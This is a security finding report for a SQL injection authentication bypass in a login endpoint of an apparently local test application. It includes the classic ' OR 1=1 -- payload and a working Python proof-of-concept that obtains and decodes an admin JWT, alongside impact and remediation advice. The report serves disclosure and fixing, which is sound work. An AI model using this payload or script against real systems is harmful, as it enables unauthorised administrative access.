# SQL Injection in Login Endpoint Authentication Bypass

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-09-04 15:17:16 UTC
**Target:** http://host.docker.internal:3100
**Endpoint:** /rest/user/login
**Method:** POST
**CWE:** CWE-89
**CVSS:** 9.1
**Confidence:** High
**Fix Effort:** Low

## Description

The `/rest/user/login` endpoint is vulnerable to SQL injection in the email parameter, allowing unauthenticated attackers to bypass authentication and gain admin access without valid credentials.

## Evidence

POST /rest/user/login returned HTTP 200 with valid admin JWT token. Response shows role=admin and user id=1 in token payload. Token is valid for authenticated requests. SQL injection in email parameter bypasses password verification entirely.

## Impact

An unauthenticated attacker can bypass the login mechanism entirely, obtaining a valid admin JWT token without knowing any credentials. This grants full administrative access to the application, including user management, data access, and system configuration.

## Counterevidence

No input validation, WAF, or SQL parameterization found on login endpoint. Application directly uses user-supplied email in SQL query construction. Injection works without pre-existing credentials. No rate limiting or login throttling observed.

## What Would Change This Severity

Confirmation this is internet-facing deployment maintains critical severity. Implementation of input validation or query parameterization would eliminate the vulnerability.

## Technical Analysis

The login endpoint constructs a SQL query using string concatenation with unsanitized user input from the email parameter. The query appears to be: SELECT * FROM Users WHERE email = '[email]' AND password = '[password]'. By injecting ' OR 1=1 --, the attacker modifies the WHERE clause to return the first user in the database (the admin account with id=1). The application then generates a JWT token for this admin user without verifying the password.

## Proof of Concept

1. Send a POST request to /rest/user/login with email parameter containing SQL injection payload ' OR 1=1 -- and any password value. 2. The server responds with HTTP 200 and a valid JWT token for the admin user. 3. The JWT token contains user data including role=admin and can be used to authenticate as the admin user. 4. Use the token to access admin-only endpoints.

```python
import requests
import json

url = "http://host.docker.internal:3100/rest/user/login"

payload = {
    "email": "' OR 1=1 --",
    "password": "anything"
}

response = requests.post(url, json=payload)

print("Status Code:", response.status_code)
print("Response:", json.dumps(response.json(), indent=2))

if response.status_code == 200:
    token = response.json()['authentication']['token']
    print("\n[+] Successfully bypassed authentication!")
    print("[+] Admin JWT Token obtained:", token[:50] + "...")
    
    import base64
    parts = token.split('.')
    payload_part = parts[1]
    payload_part += '=' * (4 - len(payload_part) % 4)
    decoded = json.loads(base64.urlsafe_b64decode(payload_part))
    print("[+] Token user role:", decoded['data']['role'])
    print("[+] Token user ID:", decoded['data']['id'])
```

## Remediation

Use parameterized queries or prepared statements for all SQL operations. In Node.js, use placeholders instead of string concatenation: db.query('SELECT * FROM Users WHERE email = ? AND password = ?', [email, password]). Implement input validation to reject SQL syntax characters in email fields. Use ORM frameworks that enforce parameterized queries by default.

## Assumptions

Assumes endpoint accepts JSON POST requests and SQL queries are constructed using string concatenation without parameterized queries.
